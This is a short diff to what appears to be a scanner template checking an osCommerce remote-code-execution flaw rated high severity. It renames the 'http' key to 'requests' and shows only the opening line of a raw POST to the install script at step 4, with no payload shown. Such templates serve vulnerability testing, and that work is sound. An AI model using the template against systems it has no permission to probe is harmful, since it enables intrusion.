@@ -8,7 +8,7 @@ info:
   severity: high
   tags: rce,oscommerce
 
-http:
+requests:
   - raw:
       - |
         POST /install/install.php?step=4 HTTP/1.1
